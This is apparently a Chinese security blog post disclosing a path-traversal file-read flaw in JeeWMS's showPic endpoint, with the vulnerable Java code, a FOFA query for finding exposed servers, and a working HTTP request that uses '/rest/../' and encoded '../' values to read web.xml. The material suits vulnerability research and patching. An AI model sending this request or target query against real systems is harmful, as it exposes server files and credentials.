---
title: "JeeWMS cgformTemplateController.do 文件读取漏洞"
source: https://mrxn.net/jswz/JeeWMS-cgformTemplateController-showPic-fileread.html
asset_dir: assets/jeewms-cgformtemplatecontroller.do-文件读取漏洞
---

# JeeWMS cgformTemplateController.do 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/21 08:22
* 904浏览
* [0评论](#comment)
* 36分钟阅读

深入探索

SQL

软件

文件系统


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS `cgformTemplateController.do` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取服务器上任意文件内容，造成敏感信息泄露。

漏洞预警服务

# 影响版本

20250515（最新版本）

# fofa语法

> `body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"`

# 漏洞分析

深入探索

在线安全工具

安全工具开发

技术文章订阅

直接看 `showPic` 的实现部分 `src/main/java/org/jeecgframework/web/cgform/controller/template/CgformTemplateController.java`

```
    /**
     * 查看图片
     * @param request
     * @param code
     * @param path
     * @param response
     */
    @RequestMapping(params = "showPic")
    public void showPic(HttpServletRequest request,String code, String path,HttpServletResponse response){
        String defaultPath="default.jpg";
        String defaultCode="default/images/";
        //无图片情况
        if(path==null){
            path=defaultPath;
            code=defaultCode;
        }else{
            //临时图片
            if(code==null){
                code="temp/";
            }else{
                code+="/images/";
            }
        }
        FileInputStream fis = null;
        OutputStream out = null;
        response.setContentType("image/" + FileUtils.getExtend(path));
        try {
            out = response.getOutputStream();
            File file = new File(getUploadBasePath(request),code+path);
            if(!file.exists()||file.isDirectory()){
                file=new File(getUploadBasePath(request),defaultCode+defaultPath);
            }
            fis = new FileInputStream(file);
            byte[] b = new byte[fis.available()];
            fis.read(b);
            out.write(b);
            out.flush();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (fis != null) {
                try {
                    fis.close();
                    out.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
```

再看下 `getUploadBasePath` 方法的实现

计算机服务器

```
//获取上传根路径
    private String getUploadBasePath(HttpServletRequest request){

//      String path=request.getSession().getServletContext().getRealPath("/WEB-INF/classes/online/template");

        ClassLoader classLoader = this.getClass().getClassLoader();  
        URL resource = classLoader.getResource("sysConfig.properties");
        String path = resource.getPath(); 
        path = path.substring(0,path.indexOf("sysConfig.properties"))+"online/template";
//      String path= this.getClass().getResource("/").getPath()+"online/template";

        path = path.replaceAll("%20", " ");//解决tomcat安装路径包含空格的问题
        return path;
    }
```

* 代码中直接将前端传入的 `code`、`path` 拼接到服务器文件系统路径上：  
  File file = new File(getUploadBasePath(request), code + path);
* 对 `code`、`path` 从未做任何白名单、黑名单或正规化处理，也未限制只能在某个子目录下读取。
* 这样一来，攻击者可以通过在 `code` 或 `path` 中携带“../”等路径穿越字符，访问任意文件。
* 虽然有 `if(!file.exists()||file.isDirectory())` 的判断，但只判断了文件是否存在或是否为目录，不会阻止“../”跳出预期目录。
* `getUploadBasePath` 返回的基础目录是 `/WEB-INF/classes/online/template`
* code=“../../../” → 拼接后变为 “../../../images/”
* path=“../web.xml”
* 合并后为 `/online/template/../../../images/../web.xml` 最终变为 `/WEB-INF/web.xml`

整体执行流程如下图所示

漏洞预警服务

[![JeeWMS cgformTemplateController.do 文件读取漏洞](images/img-001-7a776329eff3.webp)](https://image.mrxn.net/d32f91cccb5044e8b9dac9406ed18f66.webp)

其次是根据 JeeWMS 框架的特点，访问URL也就是： `/jeewms/cgformTemplateController.do` (注意 jeewms 不一定存在)，结合前面的[权限绕过分析文章](https://mrxn.net/jswz/JeeWMS-commonController-upload-rce.html)，也可以是 `/jeewms/rest/../cgformTemplateController.do` 或者 `/rest/../cgformTemplateController.do`

# 漏洞复现

```
POST /rest/../cgformTemplateController.do?showPic HTTP/1.1
Host: localhost:8081
Content-Type: application/x-www-form-urlencoded

code=%2E%2E%2F%2E%2E%2F%2E%2E%2F&path=%2E%2E%2Fweb.xml
```

成功读取到 `web.xml` 文件

[![JeeWMS cgformTemplateController.do 文件读取漏洞](images/img-002-c9e087d4ccfc.webp)](https://image.mrxn.net/3ce7d705bc934201a4dd04c5d4fc1e35.webp)

# 参考

* `https://gitee.com/erzhongxmu/JEEWMS/issues/I8YN90`
* `https://gitee.com/erzhongxmu/JEEWMS/issues/IC5FNV`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[JeeWMS cgformTemplateController.do 文件读取漏洞](https://mrxn.net/jswz/JeeWMS-cgformTemplateController-showPic-fileread.html)  
文章链接：<https://mrxn.net/jswz/JeeWMS-cgformTemplateController-showPic-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

计算机服务器

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/JeeWMS-cgformTemplateController-showPic-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机驱动器和存储设备

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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